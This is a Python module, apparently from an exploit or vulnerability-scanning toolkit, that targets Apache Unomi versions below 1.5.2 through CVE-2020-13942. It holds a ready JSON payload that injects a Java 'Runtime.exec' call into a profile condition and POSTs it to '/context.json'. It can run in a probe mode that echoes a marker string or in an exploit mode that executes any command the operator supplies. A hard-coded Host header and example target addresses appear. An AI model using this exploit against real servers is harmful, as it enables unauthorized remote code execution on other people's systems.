import requests,json
from ClassCongregation import _urlparse
from requests_toolbelt.utils import dump
import CodeTest
################
##--ApacheSolr--##
#CVE-2020-13942 无回显的命令执行, < 1.5.2, apache unomi remote code execution
################
#echo VuLnEcHoPoCSuCCeSS
#VULN = None => 漏洞测试
#VULN = True => 命令执行
CodeTest.VULN = None
TIMEOUT = 10
class ApacheUnomi():
    def __init__(self, url, CMD):
        self.url = url
        self.CMD = CMD
        self.payload_cve_2020_13942 = '''{ "filters": [ { "id": "myfilter1_anystr", "filters": [ { "condition": {  "parameterValues": {  "": "script::Runtime r = Runtime.getRuntime(); r.exec(\\"RECOMMAND\\");" }, "type": "profilePropertyCondition" } } ] } ], "sessionId": "test-demo-session-id_anystr" }'''

    def cve_2020_13942(self):
        self.pocname = "Apache Unomi: CVE-2020-13942"
        self.method = "post"
        self.rawdata = "null"
        self.info = CodeTest.Colored_.rce()
        self.r = "PoCWating"
        self.payload = self.payload_cve_2020_13942.replace("RECOMMAND", self.CMD)
        self.headers = {
            'Host': '34.87.38.169:8181',
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
            'Accept': '*/*',
            'Connection': 'close',
            'Content-Type': 'application/json'
        }
        try:
            self.request = requests.post(self.url + "/context.json", data=self.payload, headers=self.headers,
                                         timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
            self.rep = list(json.loads(self.request.text)["trackedConditions"])[0]["parameterValues"]["pagePath"]
            if CodeTest.VULN == None:
                if r"/tracker/" in self.rep:
                    self.r = "PoCSuSpEct"
                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                self.r = "Command Executed Successfully (But No Echo)"
                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

print("""eg: https://49.233.64.75:9443
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Target type       | Vuln Name        | Poc | Exp | Impact Version && Vulnerability description                 |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Apache Unomi      | CVE-2020-13942   |  Y  |  Y  | < 1.5.2, apache unomi remote code execution                 |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+""")
def check(**kwargs):
    if CodeTest.VULN == None:
        ExpApacheUnomi = ApacheUnomi(_urlparse(kwargs['url']),"echo VuLnEcHoPoCSuCCeSS")
    else:
        ExpApacheUnomi = ApacheUnomi(_urlparse(kwargs['url']),kwargs['cmd'])
    if kwargs['pocname'] == "cve_2020_13942":
        ExpApacheUnomi.cve_2020_13942()
    else:
        ExpApacheUnomi.cve_2020_13942()

